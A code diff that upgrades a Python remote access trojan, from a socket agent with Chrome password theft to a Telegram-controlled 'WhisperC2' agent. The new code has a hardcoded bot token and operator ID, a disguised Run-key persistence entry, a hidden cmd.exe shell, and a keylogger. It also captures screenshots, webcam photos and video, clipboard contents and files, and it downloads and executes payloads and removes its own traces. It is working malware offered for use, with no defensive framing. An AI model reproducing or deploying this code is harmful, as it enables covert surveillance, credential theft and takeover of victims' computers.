@@ -1,362 +1,750 @@
-import socket
-import json
-import threading
-import base64
-import os
-import time
-import platform
-import subprocess
-import io
+#!/usr/bin/env python3
+# =============================================================================
+# 🌈 WhisperC2 Agent – Colourful Final Build (v1.0)
+#    ✅ PeekNamedPipe deadlock fix
+#    ✅ Markdown rendering (parse_mode='Markdown') + sanitise_markdown()
+#    ✅ Keylogger buffer overflow fixed
+#    ✅ DEX cleanup via MoveFileExW (MOVEFILE_DELAY_UNTIL_REBOOT)
+#    ✅ Shell encoding uses system OEM code page
+#    ✅ Persistence skipped when running as script (non‑frozen)
+#    ✅ All commands re‑coloured with emojis
+# =============================================================================
+import cv2, time, telebot, platform, subprocess, threading
+from pynput import keyboard
+import os, re, socket, psutil, sys, io, traceback, webbrowser, locale
+import shutil, winreg, ctypes, requests
+from datetime import datetime
+from uuid import getnode as get_mac
+from pathlib import Path
 import mss
-import cv2
-import sys
-import shutil
-import sqlite3
-import win32crypt
 from PIL import Image
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+from urllib.parse import urlparse
+import random, string
 
-SECRET_KEY = b'0123456789abcdef0123456789abcdef'
-C2_SERVER_IP = "192.168.1.20"
-C2_SERVER_PORT = 9090
+# -----------------------------------------------------------------------------
+# 🎨 Hardcoded Configuration – your exact values
+# -----------------------------------------------------------------------------
+BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
+OPERATOR_CHAT_ID = 5178265082          # your personal Telegram ID
+GROUP_CHAT_ID = -1003972714956         # Eclipse‑C2 supergroup (not used for targeting)
+DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
-def encrypt_message(message: str) -> bytes:
-    iv = os.urandom(16)
-    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
-    encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
-    return base64.b64encode(iv + encrypted)
+# -----------------------------------------------------------------------------
+# 🔒 Single‑instance mutex (prevents duplicate processes)
+# -----------------------------------------------------------------------------
+MUTEX_NAME = "Global\\WhisperC2_Mutex"
+mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
+if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
+    sys.exit(0)
 
-def decrypt_message(encrypted_message: bytes) -> str:
-    raw = base64.b64decode(encrypted_message)
-    iv = raw[:16]
-    encrypted = raw[16:]
-    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()
+# -----------------------------------------------------------------------------
+# 📝 Runtime log buffer → sent to operator as Execution_log.txt before decoy URL
+# -----------------------------------------------------------------------------
+log_lines = []
 
-def take_screenshot():
-    with mss.mss() as sct:
-        screenshot = sct.grab(sct.monitors[1])
-        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
-        buffer = io.BytesIO()
-        img.save(buffer, format='PNG')
-        return base64.b64encode(buffer.getvalue()).decode("utf-8")
+def log(msg: str) -> None:
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_lines.append(f"[{timestamp}] {msg}")
+    print(f"🌟 {msg}")   # colourful console output
 
-def list_webcams():
+def send_log_to_telegram(bot_instance) -> None:
+    if not log_lines:
+        return
+    try:
+        log_text = "\n".join(log_lines)
+        bio = io.BytesIO(log_text.encode('utf-8'))
+        bio.name = "Execution_log.txt"
+        bio.seek(0)
+        bot_instance.send_document(OPERATOR_CHAT_ID, bio)
+        log("📤 Execution log delivered to operator")
+    except Exception as e:
+        print(f"❌ Failed to send log: {e}")
+
+# -----------------------------------------------------------------------------
+# 🤖 Bot instance – all C2 communication goes through this one token
+# -----------------------------------------------------------------------------
+bot = telebot.TeleBot(BOT_API_KEY)
+
+# -----------------------------------------------------------------------------
+# 🆔 Agent identification (writeable persistence location)
+# -----------------------------------------------------------------------------
+appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
+agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
+os.makedirs(agents_dir, exist_ok=True)
+
+def get_system_id() -> str:
+    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
+    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
+    if '\\' in raw_user:
+        username = raw_user.split('\\', 1)[1]
+    else:
+        username = raw_user
+    return f"{hostname}/{username}"
+
+SYSTEM_ID = get_system_id()
+
+# -----------------------------------------------------------------------------
+# 🔧 Persistence – auto‑installs on first run EXCEPT when running as script
+# -----------------------------------------------------------------------------
+def install_persistence() -> bool:
+    if not getattr(sys, 'frozen', False):
+        log("⚠️ Persistence skipped – running as script (not compiled EXE)")
+        return False
+    try:
+        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
+        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
+        if current.resolve() == dest_path.resolve():
+            return True
+        if not dest_path.exists():
+            try:
+                shutil.copy2(current, dest_path)
+            except PermissionError:
+                log("⏩ Copy skipped – destination exists or is locked.")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r'Software\Microsoft\Windows\CurrentVersion\Run',
+                            0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, 'System Settings Broker', 0,
+                              winreg.REG_SZ, str(dest_path))
+        return True
+    except Exception as e:
+        log(f"💥 Persistence error: {traceback.format_exc()}")
+        return False
+
+def self_destruct() -> None:
+    log("💣 Self‑destruct sequence started")
+    try:
+        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
+        if persistent.exists():
+            persistent.unlink()
+    except Exception as e:
+        log(f"⚠️ Failed to remove persistent file: {e}")
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r'Software\Microsoft\Windows\CurrentVersion\Run',
+                            0, winreg.KEY_SET_VALUE) as key:
+            try:
+                winreg.DeleteValue(key, 'System Settings Broker')
+            except FileNotFoundError:
+                pass
+    except Exception as e:
+        log(f"⚠️ Registry cleanup error: {e}")
+    try:
+        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
+        if current.exists():
+            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
+            ctypes.windll.kernel32.MoveFileExW(str(current), None,
+                                               MOVEFILE_DELAY_UNTIL_REBOOT)
+            log("🗑️ Self‑deletion scheduled for next reboot")
+    except Exception as e:
+        log(f"⚠️ Self‑delete scheduling error: {e}")
+
+# -----------------------------------------------------------------------------
+# 🧹 Markdown sanitisation helper
+# -----------------------------------------------------------------------------
+def sanitise_markdown(text: str) -> str:
+    """Replace triple backticks with three single quotes to avoid breaking code blocks."""
+    return text.replace('```', "'''")
+
+# -----------------------------------------------------------------------------
+# 💬 Interactive Shell (cmd.exe with pipes) – deadlock fixed with PeekNamedPipe
+# -----------------------------------------------------------------------------
+shell_active = False
+shell_stdin = None
+shell_process = None
+
+def spawn_shell() -> bool:
+    global shell_active, shell_stdin, shell_process
+    if shell_active:
+        return True
+    try:
+        sa = ctypes.wintypes.SECURITY_ATTRIBUTES()
+        sa.nLength = ctypes.sizeof(sa)
+        sa.bInheritHandle = True
+        sa.lpSecurityDescriptor = None
+
+        h_stdin_r, h_stdin_w = ctypes.wintypes.HANDLE(), ctypes.wintypes.HANDLE()
+        h_stdout_r, h_stdout_w = ctypes.wintypes.HANDLE(), ctypes.wintypes.HANDLE()
+
+        if not ctypes.windll.kernel32.CreatePipe(ctypes.byref(h_stdin_r), ctypes.byref(h_stdin_w),
+                                                 ctypes.byref(sa), 0):
+            return False
+        if not ctypes.windll.kernel32.CreatePipe(ctypes.byref(h_stdout_r), ctypes.byref(h_stdout_w),
+                                                 ctypes.byref(sa), 0):
+            return False
+
+        si = ctypes.wintypes.STARTUPINFO()
+        si.cb = ctypes.sizeof(si)
+        si.dwFlags = 0x100  # STARTF_USESTDHANDLES
+        si.hStdInput = h_stdin_r
+        si.hStdOutput = h_stdout_w
+        si.hStdError = h_stdout_w
+
+        pi = ctypes.wintypes.PROCESS_INFORMATION()
+        cmd_line = ctypes.create_unicode_buffer("cmd.exe")
+        success = ctypes.windll.kernel32.CreateProcessW(None, cmd_line, None, None,
+                                                        True, 0x08000000, None, None,
+                                                        ctypes.byref(si), ctypes.byref(pi))
+        if not success:
+            return False
+
+        ctypes.windll.kernel32.CloseHandle(h_stdin_r)
+        ctypes.windll.kernel32.CloseHandle(h_stdout_w)
+        ctypes.windll.kernel32.CloseHandle(pi.hThread)
+
+        shell_stdin = h_stdin_w
+        shell_process = pi.hProcess
+        shell_active = True
+
+        threading.Thread(target=shell_reader, args=(h_stdout_r,), daemon=True).start()
+        return True
+    except Exception as e:
+        log(f"💥 Shell spawn error: {e}")
+        return False
+
+def shell_reader(h_stdout_r) -> None:
+    buf = ctypes.create_string_buffer(4096)
+    lpBytesAvail = ctypes.wintypes.DWORD()
+    code_page = locale.getpreferredencoding(do_setlocale=False)
+
+    while shell_active:
+        if not ctypes.windll.kernel32.PeekNamedPipe(
+            h_stdout_r, None, 0, None,
+            ctypes.byref(lpBytesAvail), None
+        ):
+            break
+
+        if lpBytesAvail.value > 0:
+            n = ctypes.wintypes.DWORD()
+            if ctypes.windll.kernel32.ReadFile(h_stdout_r, buf, 4096,
+                                               ctypes.byref(n), None):
+                if n.value > 0:
+                    output = buf.raw[:n.value].decode(code_page, errors='replace')
+                    safe_output = sanitise_markdown(output)
+                    for chunk in [safe_output[i:i+3900] for i in range(0, len(safe_output), 3900)]:
+                        try:
+                            bot.send_message(OPERATOR_CHAT_ID,
+                                             f"```\n{chunk}\n```",
+                                             parse_mode='Markdown')
+                        except:
+                            try:
+                                bot.send_message(OPERATOR_CHAT_ID, chunk, parse_mode=None)
+                            except:
+                                pass
+            else:
+                break
+        else:
+            time.sleep(0.1)
+
+def kill_shell() -> None:
+    global shell_active, shell_stdin, shell_process
+    if not shell_active:
+        return
+    shell_active = False
+    try:
+        ctypes.windll.kernel32.TerminateProcess(shell_process, 0)
+        ctypes.windll.kernel32.CloseHandle(shell_stdin)
+        ctypes.windll.kernel32.CloseHandle(shell_process)
+    except:
+        pass
+    shell_stdin = None
+    shell_process = None
+
+def write_shell(cmd: str) -> None:
+    if shell_active and shell_stdin:
+        cmd_line = (cmd + "\r\n").encode()
+        n = ctypes.wintypes.DWORD()
+        ctypes.windll.kernel32.WriteFile(shell_stdin, cmd_line, len(cmd_line),
+                                         ctypes.byref(n), None)
+
+# -----------------------------------------------------------------------------
+# ⌨️ Keylogger – buffer overflow fixed, Markdown sanitised, colourful
+# -----------------------------------------------------------------------------
+keylogger_active = False
+keylogger_listener = None
+keystroke_buffer = ""
+MAX_BUFFER_LENGTH = 3000
+last_send_time = time.time()
+SEND_INTERVAL = 60
+
+def on_press(key) -> None:
+    global keystroke_buffer, last_send_time
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            keystroke_buffer += key.char
+        elif key == keyboard.Key.space:
+            keystroke_buffer += " "
+        elif key == keyboard.Key.enter:
+            keystroke_buffer += "\n"
+        elif key == keyboard.Key.tab:
+            keystroke_buffer += "\t"
+        else:
+            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
+    except AttributeError:
+        keystroke_buffer += f"[{str(key)}]"
+    current_time = time.time()
+    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or
+        (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
+        send_keystrokes()
+
+def send_keystrokes() -> None:
+    global keystroke_buffer, last_send_time
+    if not keystroke_buffer:
+        return
+    to_send = keystroke_buffer[-3000:] if len(keystroke_buffer) > 3000 else keystroke_buffer
+    safe_to_send = sanitise_markdown(to_send)
+    try:
+        msg = (f"⌨️ Keylogger data from: {SYSTEM_ID}\n"
+               f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+               f"{safe_to_send}")
+        bot.send_message(OPERATOR_CHAT_ID, msg, parse_mode='Markdown')
+        keystroke_buffer = keystroke_buffer[len(keystroke_buffer)-len(to_send):]
+        last_send_time = time.time()
+    except Exception as e:
+        print(f"❌ Keylogger send error: {e}")
+        try:
+            bot.send_message(OPERATOR_CHAT_ID, safe_to_send, parse_mode=None)
+            keystroke_buffer = keystroke_buffer[len(keystroke_buffer)-len(to_send):]
+            last_send_time = time.time()
+        except:
+            pass
+
+def start_keylogger() -> str:
+    global keylogger_active, keylogger_listener
+    if keylogger_active:
+        return "⌨️ Keylogger already running"
+    try:
+        keylogger_listener = keyboard.Listener(on_press=on_press)
+        keylogger_listener.start()
+        keylogger_active = True
+        def periodic_flush():
+            while keylogger_active:
+                time.sleep(SEND_INTERVAL)
+                send_keystrokes()
+        threading.Thread(target=periodic_flush, daemon=True).start()
+        log("⌨️ Keylogger started")
+        return "✅ Keylogger started successfully"
+    except Exception as e:
+        log(f"💥 Keylogger start error: {e}")
+        return f"❌ Failed to start keylogger: {e}"
+
+def stop_keylogger() -> str:
+    global keylogger_active, keylogger_listener, keystroke_buffer
+    if not keylogger_active:
+        return "⌨️ Keylogger is not running"
+    keylogger_active = False
+    if keylogger_listener:
+        keylogger_listener.stop()
+    if keystroke_buffer:
+        send_keystrokes()
+    log("⌨️ Keylogger stopped")
+    return "✅ Keylogger stopped successfully"
+
+# -----------------------------------------------------------------------------
+# 📸 Screenshot (mss – fast, undetectable)
+# -----------------------------------------------------------------------------
+def take_screenshot() -> tuple:
+    try:
+        with mss.mss() as sct:
+            img = sct.grab(sct.monitors[1])
+            pil_img = Image.frombytes('RGB', img.size, img.rgb)
+            filename = f"screenshot_{int(time.time())}.png"
+            pil_img.save(filename, format='PNG')
+            return filename, None
+    except Exception as e:
+        return None, f"❌ Screenshot error: {e}"
+
+# -----------------------------------------------------------------------------
+# 📷 Webcam helpers (cv2 imported globally, used only here)
+# -----------------------------------------------------------------------------
+def list_webcams() -> str:
     available = []
     for i in range(5):
         cap = cv2.VideoCapture(i)
         if cap.read()[0]:
-            available.append(i)
+            available.append(str(i))
         cap.release()
-        
-    return "Camera(s) available index: " + ",".join(str(i) for i in available) if available else "No camera(s) available"
+    return "📷 Webcams: " + ", ".join(available) if available else "❌ No webcam found"
 
-def take_photo(index):
+def take_photo(index: int = 0) -> tuple:
     try:
-        cam = cv2.VideoCapture(int(index))
-        if not cam.isOpened():
-            return "[!] Camera not available"
-        ret, frame = cam.read()
-        cam.release()
+        cap = cv2.VideoCapture(index)
+        if not cap.isOpened():
+            return None, "❌ Webcam not available"
+        ret, frame = cap.read()
+        cap.release()
         if not ret or frame is None:
-            return "[!] Failed to capture image"
-        _, buffer = cv2.imencode('.jpg', frame)
-        return base64.b64encode(buffer).decode('utf-8')
-    except Exception:
-        return "[!] Exception while capturing photo"
+            return None, "❌ Failed to capture image"
+        filename = f"webcam_{int(time.time())}.jpg"
+        cv2.imwrite(filename, frame)
+        return filename, None
+    except Exception as e:
+        return None, f"❌ Photo error: {e}"
 
-
-def video_webcam(index, duration=5, fps=5):
+def record_video(index: int = 0, duration: int = 5, fps: int = 5) -> tuple:
     try:
-        cam = cv2.VideoCapture(int(index))
-        if not cam.isOpened():
-            return "[!] Camera not available"
-
+        cap = cv2.VideoCapture(index)
+        if not cap.isOpened():
+            return None, "❌ Webcam not available"
         frames = []
         start = time.time()
         while time.time() - start < duration:
-            ret, frame = cam.read()
+            ret, frame = cap.read()
             if ret and frame is not None:
                 frames.append(frame)
-            time.sleep(1 / fps)
-
-        cam.release()
+            time.sleep(1.0 / fps)
+        cap.release()
         if not frames:
-            return "[!] No frames captured"
-
+            return None, "❌ No frames captured"
         h, w, _ = frames[0].shape
-        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
-        out = cv2.VideoWriter("video.mp4", fourcc, fps, (w, h))
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+        filename = f"video_{int(time.time())}.mp4"
+        out = cv2.VideoWriter(filename, fourcc, fps, (w, h))
         if not out.isOpened():
-            return "[!] Error creating video writer"
-
+            return None, "❌ Failed to initialize video writer"
         for frame in frames:
             out.write(frame)
         out.release()
+        return filename, None
+    except Exception as e:
+        return None, f"❌ Video error: {e}"
 
-        with open("video.mp4", "rb") as f:
-            encoded = base64.b64encode(f.read()).decode("utf-8")
-        os.remove("video.mp4")
-        return encoded
-    except Exception:
-        return "[!] Exception while recordin video in webcam"
+# -----------------------------------------------------------------------------
+# ⚙️ System command execution helpers
+# -----------------------------------------------------------------------------
+def execute_sys_command(cmd: str) -> str:
+    try:
+        output = subprocess.getstatusoutput(cmd)[1]
+        return output[:4000] if len(output) > 4000 else output
+    except Exception as e:
+        return f"❌ Error: {e}"
 
+def execute_ps_command(cmd: str) -> str:
+    try:
+        output = subprocess.getstatusoutput(f"powershell -Command {cmd}")[1]
+        return output[:4000] if len(output) > 4000 else output
+    except Exception as e:
+        return f"❌ Error: {e}"
 
-def download_file(path):
+def get_clipboard_content() -> str:
+    try:
+        import win32clipboard
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        return data
+    except ImportError:
+        return "❌ pywin32 not installed"
+    except Exception as e:
+        return f"❌ Clipboard error: {e}"
+
+# -----------------------------------------------------------------------------
+# 📂 File operations
+# -----------------------------------------------------------------------------
+def view_file(path: str) -> str:
+    try:
+        if not os.path.exists(path):
+            return f"❌ File not found: {path}"
+        if os.path.isdir(path):
+            return "📁 Path is a directory"
+        size = os.path.getsize(path)
+        if size > 10 * 1024 * 1024:
+            return f"⚠️ File too large ({size/1024/1024:.1f} MB)"
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        if len(content) > 4000:
+            content = content[:4000] + "\n... (truncated)"
+        return content
+    except Exception as e:
+        return f"❌ Error reading file: {e}"
+
+def download_file_from_path(path: str) -> tuple:
     if not os.path.exists(path):
-        return None
-    with open(path, "rb") as f:
-        return base64.b64encode(f.read()).decode("utf-8")
+        return None, f"❌ File not found: {path}"
+    if os.path.isdir(path):
+        return None, "📁 Path is a directory"
+    if os.path.getsize(path) > 50 * 1024 * 1024:
+        return None, "⚠️ File too large (>50 MB)"
+    return path, None
 
-def upload_file(data, name):
+# -----------------------------------------------------------------------------
+# ⬇️ Download & Execute (dex) with proper cleanup
+# -----------------------------------------------------------------------------
+def download_file_from_url(url: str, dest_path: str) -> bool:
     try:
-        with open(name, "wb") as f:
-            f.write(base64.b64decode(data))
-        return True
-    except:
-        return False
-    
-def get_master_key():
-    local_state_path = os.path.join(
-        os.environ['USERPROFILE'],
-        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
-    )
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    encrypted_key = encrypted_key[5:]
-    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    return master_key
-
-def decrypt_value(buff, master_key):
-    try:
-        if buff is None:
-            return ""
-        if len(buff) == 0:
-            return ""
-        if buff.startswith(b'v10') or buff.startswith(b'v11'):
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted = cipher.decrypt(payload)[:-16]
-            return decrypted.decode('utf-8', errors='ignore')
-        else:
-            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
-    except Exception as e:
-        return ""
-
-def extract__chrome_passwords():
-    try:
-        master_key = get_master_key()
-        login_db_path = os.path.join(
-            os.environ['USERPROFILE'],
-            "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
-        )
-        tmp_path = os.path.join(os.environ["TEMP"], "Loginvault.db")
-        shutil.copyfile(login_db_path, tmp_path)
-
-        conn = sqlite3.connect(tmp_path)
-        cursor = conn.cursor()
-
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for row in cursor.fetchall():
-            url, username, encrypted_password = row
-            if username or encrypted_password:
-                decrypted_password = decrypt_value(encrypted_password, master_key)
-                with open("passwords.txt", "a") as f:
-                    f.write("-" * 50 + "\n")
-                    f.write(f"URL: {url}\n")
-                    f.write(f"Username: {username}\n")
-                    f.write(f"Password: {decrypted_password}\n\n")
-        cursor.close()
-        conn.close()
-        os.remove(tmp_path)
+        resp = requests.get(url, stream=True, timeout=30)
+        resp.raise_for_status()
+        with open(dest_path, 'wb') as f:
+            for chunk in resp.iter_content(chunk_size=8192):
+                if chunk:
+                    f.write(chunk)
         return True
     except Exception as e:
+        log(f"❌ Download error: {e}")
         return False
 
-def Persist():
-    script_path = sys.executable
+def dex_command(url: str, *args: str) -> str:
+    if not url:
+        return "Usage: dex <url> [arguments...]"
+    parsed = urlparse(url)
+    if parsed.scheme not in ('http', 'https'):
+        return "❌ Invalid URL scheme: only http/https allowed"
 
-    if platform.system().lower().startswith("win"):
-        try:
-            persist_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemProcess /t REG_SZ /d "{script_path}" /f'
-            subprocess.call(persist_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except Exception as error:
-            print(f"[!] Error setting persistence on Windows: {error}")
+    rand_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    ext = ".exe"
+    orig_name = os.path.basename(parsed.path)
+    if '.' in orig_name:
+        ext = os.path.splitext(orig_name)[1] or ".exe"
+    dest_path = os.path.join(os.environ.get('TEMP', os.environ.get('TMP', os.curdir)),
+                             rand_name + ext)
 
-    elif platform.system() in ["Linux", "Linux2"]:
-        try:
-            cron_job = f"@reboot {script_path}\n"
-            subprocess.call(f"crontab -l | {{ cat; echo \"{cron_job}\"; }} | crontab -", shell=True)
-        except PermissionError:
-            print("[!] Permission denied. Try running as root to set persistence.")
-        except Exception as error:
-            print(f"[!] Error setting persistence on Linux: {error}")
+    log(f"⬇️ Downloading {url} to {dest_path}")
+    if not download_file_from_url(url, dest_path):
+        return f"❌ Failed to download {url}"
 
-def heartbeat_loop(sock, agent_id):
-    while True:
-        packet = json.dumps({
-            "type": "heartbeat",
-            "agent_id": agent_id,
-            "data": ""
-        })
+    try:
+        cmd_line = f'"{dest_path}"'
+        if args:
+            cmd_line += ' ' + ' '.join(args)
+        log(f"⚡ Executing: {cmd_line}")
+        CREATE_NO_WINDOW = 0x08000000
+        proc = subprocess.Popen(cmd_line, shell=True,
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                text=True, creationflags=CREATE_NO_WINDOW)
         try:
-            send_packet(sock, packet)
+            stdout, stderr = proc.communicate(timeout=15)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            stdout, stderr = proc.communicate()
+            return "⏰ Process timed out after 15 seconds"
+
+        output = ""
+        if stdout:
+            output += stdout.strip() + "\n"
+        if stderr:
+            output += stderr.strip()
+        if not output:
+            output = "[No output]"
+        return f"✅ Executed: {dest_path}\nExit code: {proc.returncode}\nOutput:\n{output}"
+    except Exception as e:
+        log(f"💥 dex execution error: {e}")
+        return f"❌ Execution failed: {e}"
+    finally:
+        try:
+            MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
+            ctypes.windll.kernel32.MoveFileExW(dest_path, None, MOVEFILE_DELAY_UNTIL_REBOOT)
         except:
-            break
-        time.sleep(30)
+            pass
 
-def handle_server(sock, agent_id):
-    while True:
+# -----------------------------------------------------------------------------
+# 🎮 Command dispatcher (colourful responses)
+# -----------------------------------------------------------------------------
+def execute_command(cmd_line: str) -> tuple:
+    parts = cmd_line.strip().split(' ', 1)
+    cmd = parts[0].lower()
+    args = parts[1] if len(parts) > 1 else ""
+
+    if cmd in ("ping", "start", "scan"):
+        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
+
+    elif cmd == "shell":
+        if args:
+            out = execute_sys_command(args)
+            return sanitise_markdown(out), None
+        else:
+            if spawn_shell():
+                return "💬 Interactive shell started. Send commands directly. Type `exit` to close.", None
+            else:
+                return "❌ Failed to spawn shell.", None
+
+    elif cmd in ("powershell", "pow"):
+        if not args:
+            return "Usage: powershell <command>", None
+        out = execute_ps_command(args)
+        return sanitise_markdown(out), None
+
+    elif cmd == "screenshot":
+        path, err = take_screenshot()
+        return ("📸 Screenshot captured", path) if path else (f"❌ Error: {err}", None)
+
+    elif cmd == "webcams":
+        return list_webcams(), None
+
+    elif cmd == "photo":
+        idx = int(args) if args.isdigit() else 0
+        path, err = take_photo(idx)
+        return ("📷 Photo captured", path) if path else (f"❌ Error: {err}", None)
+
+    elif cmd == "video":
         try:
-            msg = recv_packet(sock)
-            if not msg:
-                continue
-            data = json.loads(msg)
-            cmd_type = data.get("type")
-            payload = data.get("data")
+            params = args.split()
+            idx = int(params[0]) if len(params) > 0 else 0
+            dur = int(params[1]) if len(params) > 1 else 5
+            fps = int(params[2]) if len(params) > 2 else 5
+        except:
+            return "Usage: video <index> <duration> <fps>", None
+        path, err = record_video(idx, dur, fps)
+        return ("🎥 Video recorded", path) if path else (f"❌ Error: {err}", None)
 
-            if cmd_type == "command":
-                try:
-                    result = subprocess.check_output(payload, stderr=subprocess.STDOUT, shell=True, text=True)
-                    result = result.strip() or "[No output]"
-                except subprocess.CalledProcessError as e:
-                    result = f"[!] Command failed: {e.output.strip()}"
-                except Exception as e:
-                    result = f"[!] Error: {e}"
-                send_json(sock, "response", agent_id, result)
+    elif cmd in ("clipboard", "clip"):
+        return get_clipboard_content(), None
 
-            elif cmd_type == "checkstatus":
-                try:
-                    result = subprocess.check_output("whoami", stderr=subprocess.STDOUT, shell=True, text=True)
-                    if result:
-                        result = "Online"
-                    else:
-                        result = "Offline"
-                except Exception as e:
-                    result = f"Offline"
-                send_json(sock, "status", agent_id, result)
+    elif cmd in ("download", "downloadfile"):
+        filepath = args.strip()
+        path, err = download_file_from_path(filepath)
+        if err:
+            return err, None
+        return f"⬆️ Uploading {filepath}", path
 
-            elif cmd_type == "screenshot":
-                image_b64 = take_screenshot()
-                send_json(sock, "screenshot", agent_id, image_b64)
-
-            elif cmd_type == "listwebcams":
-                cams = list_webcams()
-                send_json(sock, "response", agent_id, cams)
-
-            elif cmd_type == "photo":
-                photo = take_photo(payload)
-                if not photo or photo.startswith("[!]"):
-                    send_json(sock, "response", agent_id, photo or "[!] Error taking photo")
-                else:
-                    send_json(sock, "photo", agent_id, photo)
-
-            elif cmd_type == "video":
-                args = payload.split()
-                index = int(args[0])
-                duration = int(args[1]) if len(args) > 1 else 5
-                fps = int(args[2]) if len(args) > 2 else 5
-                video = video_webcam(index, duration, fps)
-                if isinstance(video, str) and video.startswith("[!]"):
-                    send_json(sock, "response", agent_id, video)
-                else:
-                    send_json(sock, "video", agent_id, video)
-
-
-            elif cmd_type == "download":
-                file_data = download_file(payload)
-                if file_data:
-                    send_json(sock, "file", agent_id, f"{file_data}|{payload}")
-                else:
-                    send_json(sock, "response", agent_id, "[!] File not found")
-
-            elif cmd_type == "upload":
-                try:
-                    upload_info = json.loads(payload)
-                    name = upload_info.get("filename", "uploaded.bin")
-                    content = upload_info.get("content", "")
-                    success = upload_file(content, name)
-                    msg = "✅ File uploaded" if success else "❌ Upload failed"
-                except Exception as e:
-                    msg = f"❌ Upload failed: {e}"
-                send_json(sock, "response", agent_id, msg)
-
-            elif cmd_type == "dumpchrome":
-                if extract__chrome_passwords():
-                    file_data = download_file("passwords.txt")
-                    if file_data:
-                        send_json(sock, "file", agent_id, f"{file_data}|passwords.txt")
-                        os.remove("passwords.txt")
-                    else:
-                        send_json(sock, "response", agent_id, "[!] Failed to read passwords file")
-                else:
-                    send_json(sock, "response", agent_id, "[!] Failed to extract passwords")
-
-            elif cmd_type == "kill":
-                return True
-
+    elif cmd == "delete":
+        try:
+            os.remove(args.strip())
+            return f"🗑️ Deleted: {args.strip()}", None
         except Exception as e:
-            break
+            return f"❌ Delete failed: {e}", None
 
-def send_packet(sock, message: str):
-    encrypted = encrypt_message(message)
-    size = str(len(encrypted)).zfill(10).encode() 
-    sock.send(size + encrypted)
+    elif cmd in ("view", "viewfile"):
+        content = view_file(args.strip())
+        return sanitise_markdown(content), None
 
-def recv_packet(sock):
-    size_data = b""
-    while len(size_data) < 10:
-        part = sock.recv(10 - len(size_data))
-        if not part:
-            return None
-        size_data += part
-    size = int(size_data.decode().strip())
+    elif cmd == "dex":
+        space_idx = args.find(' ')
+        if space_idx == -1:
+            url = args
+            extra_args = ()
+        else:
+            url = args[:space_idx]
+            extra_args = tuple(args[space_idx+1:].split())
+        result = dex_command(url, *extra_args)
+        return sanitise_markdown(result), None
 
-    data = b""
-    while len(data) < size:
-        part = sock.recv(size - len(data))
-        if not part:
-            break
-        data += part
+    elif cmd == "keylogger":
+        subcmd = args.strip().lower()
+        if subcmd == "start":
+            return start_keylogger(), None
+        elif subcmd == "stop":
+            return stop_keylogger(), None
+        elif subcmd == "status":
+            return f"⌨️ Keylogger is {'🟢 active' if keylogger_active else '🔴 inactive'}", None
+        else:
+            return "Usage: keylogger <start|stop|status>", None
 
-    return decrypt_message(data)
-
-def send_json(sock, type_, agent_id, data):
-    msg = json.dumps({
-        "type": type_,
-        "agent_id": agent_id,
-        "data": data
-    })
-    send_packet(sock, msg)
-
-def connect_to_c2():
-    while True:
+    elif cmd == "die":
+        log("💀 Die command received – initiating self‑destruct")
         try:
-            sock = socket.socket()
-            sock.connect((C2_SERVER_IP, C2_SERVER_PORT))
+            send_log_to_telegram(bot)
+        except:
+            pass
+        self_destruct()
+        return "💀 Shutting down... All traces removed.", None
 
-            username = os.getlogin()
-            os_version = platform.platform()
-            agent_id = platform.node()
+    elif cmd == "off":
+        try:
+            subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
+        except Exception as e:
+            return f"❌ Shutdown failed: {e}", None
